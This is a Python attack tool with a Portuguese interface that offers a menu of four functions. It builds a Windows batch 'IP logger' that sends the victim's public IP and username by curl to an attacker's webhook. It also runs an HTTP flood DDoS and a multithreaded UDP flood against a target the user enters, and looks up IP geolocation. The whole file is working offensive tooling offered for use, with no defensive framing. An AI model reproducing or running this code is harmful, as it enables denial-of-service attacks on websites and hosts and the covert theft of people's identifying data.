import socket
import random
import threading
import requests
import time
import sys
import os
import asyncio
import aiohttp
from datetime import datetime
from colorama import Fore, init

# Inicializa o colorama para cores no Windows
init(autoreset=True)

os.system('cls') if os.name == 'nt' else os.system('clear')
print(f"""
{Fore.CYAN}  ██████╗ ██╗     ██╗  ██╗ ██████╗         ██████╗ ███████╗    ██████╗ ███████╗██╗   ██╗███████╗
{Fore.CYAN} ██╔═══██╗██║     ██║  ██║██╔═══██╗        ██╔══██╗██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝
{Fore.CYAN} ██║   ██║██║     ███████║██║   ██║        ██║  ██║█████╗      ██║  ██║█████╗  ██║   ██║███████╗
{Fore.CYAN} ██║   ██║██║     ██╔══██║██║   ██║        ██║  ██║██╔══╝      ██║  ██║██╔══╝  ██║   ██║╚════██║
{Fore.CYAN} ╚██████╔╝███████╗██║  ██║╚██████╔╝        ██████╔╝███████╗    ██████╔╝███████╗╚██████╔╝███████║
{Fore.CYAN}  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝         ╚═════╝ ╚══════╝    ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
{Fore.RESET}                                                                                 
""")

packets = 0
fetches = 0

def ip_lookup(ip_address):
    try:
        response = requests.get(f'https://ipinfo.io/{ip_address}/json', timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "IP": data.get("ip"),
                "City": data.get("city"),
                "Region": data.get("region"),
                "Country": data.get("country"),
                "Location": data.get("loc"),
                "Org": data.get("org"),
                "Hostname": data.get("hostname", "N/A")
            }
        return {"Error": f"Erro na requisição (Status {response.status_code})"}
    except Exception as e:
        return {"Error": str(e)}

def send_packet(ipa, port):
    global packets
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'Cyber DoS', (ipa, port))
            packets += 1
            s.close()
        except:
            pass

def ipbomb_manager(ip, port):
    global packets
    print(f"{Fore.GREEN}[+] Iniciando IP Bomb em {ip}:{port}...")
    # Cria múltiplas threads para aumentar a carga
    for i in range(100):
        t = threading.Thread(target=send_packet, args=(ip, port), daemon=True)
        t.start()
    
    try:
        while True:
            sys.stdout.write(f'\r{Fore.CYAN}Pacotes enviados: {packets} | Alvo: {ip}:{port}')
            sys.stdout.flush()
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrompido pelo usuário.")

async def flood(session, url):
    global fetches
    while True:
        try:
            async with session.get(url, timeout=5) as response:
                fetches += 1
                sys.stdout.write(f"\r{Fore.CYAN}Status: {response.status} | Requests: [{fetches}]")
                sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"\r{Fore.RED}Erro: {e}")
            sys.stdout.flush()

async def main_flood(url):
    async with aiohttp.ClientSession() as session:
        tasks = [flood(session, url) for _ in range(100)]
        await asyncio.gather(*tasks)

def buildlogger(wb):
    code = f"""@echo off
set webhook={wb}
curl ifconfig.co/ > ip.txt
set /p ip=<ip.txt
del ip.txt
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"IP: %ip%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"User: %username%\\"}}" %webhook%
"""
    with open('iplogger.bat', 'w', encoding='utf-8') as f:
        f.write(code)
    print(f"{Fore.GREEN}[+] Arquivo 'iplogger.bat' criado com sucesso.")

print(f"{Fore.CYAN} [1] IP Logger")
print(f"{Fore.CYAN} [2] DDoS (HTTP Flood)")
print(f"{Fore.CYAN} [3] IP Bomb (UDP)")
print(f"{Fore.CYAN} [4] IP Lookup")
print(f"{Fore.CYAN} [5] Sair")
choice = input('==> ')

if choice == '1':
    webhook = input('Insira o seu webhook: ')
    buildlogger(webhook)
elif choice == '2':
    url = input('Insira a URL alvo (ex: http://site.com): ')
    try:
        asyncio.run(main_flood(url))
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrompido.")
elif choice == '3':
    ip = input('Insira o IP alvo: ')
    port = int(input('Insira a porta: '))
    ipbomb_manager(ip, port)
elif choice == '4':
    lookip = input('Insira o IP alvo: ')
    result = ip_lookup(lookip)
    for key, value in result.items():
        print(f'{Fore.YELLOW}{key}: {Fore.WHITE}{value}')
    input(f"\n{Fore.CYAN}Pressione Enter para sair...")
elif choice == '5':
    sys.exit()
else:
    print(f"{Fore.RED}Opção inválida.")
